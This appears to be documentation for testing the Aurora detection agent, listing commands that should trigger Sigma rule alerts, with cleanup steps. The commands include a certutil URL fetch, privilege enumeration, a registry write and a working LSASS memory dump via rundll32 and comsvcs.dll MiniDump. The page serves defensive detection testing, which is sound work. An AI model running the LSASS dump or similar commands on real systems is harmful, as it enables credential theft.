Function Tests
==============

There are easy ways to test Aurora and see if it matches suspicious / malicious events.

Process Creation
----------------

This should create a ``WARNING`` level message for a Sigma rule with level ``high``.

.. code:: winbatch

    whoami /priv

This should create a ``WARNING`` level message for a Sigma rule with level ``high``.

.. code:: winbatch

    certutil.exe -urlcache http://test.com

Included in profiles: Minimal, Reduced, Standard, Intense

Network Communication
---------------------

This should create a ``ALERT`` level message for a Sigma rule with level ``critical``.

.. code:: winbatch 

    ping aaa.stage.123456.test.com

Included in profiles: Minimal, Reduced, Standard, Intense

File Creation
-------------

This should create a ``WARNING`` level message for a Sigma rule with level ``high``.

.. code:: winbatch 

    echo "test" > %temp%\lsass.dmp

Included in profiles: Minimal, Reduced, Standard, Intense

Process Access
-------------

This should create a ``WARNING`` level message for a Sigma rule with level ``high``.

.. code:: powershell 

    $id = Get-Process lsass; rundll32.exe C:\Windows\System32\comsvcs.dll , MiniDump $id.Id $env:temp\lsass.dmp full

Cleanup:

.. code:: winbatch
    del /f %temp%\lsass.dmp

Included in profiles: Standard, Intense

Registry
--------

This should create a ``WARNING`` level message for a Sigma rule with level ``high``.

.. code:: winbatch 

    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AuroraTest" /V "AuroraTest" /t REG_SZ /F /D "vbscript"

Cleanup:
.. code:: winbatch

    reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AuroraTest" /F 

Included in profiles: Intense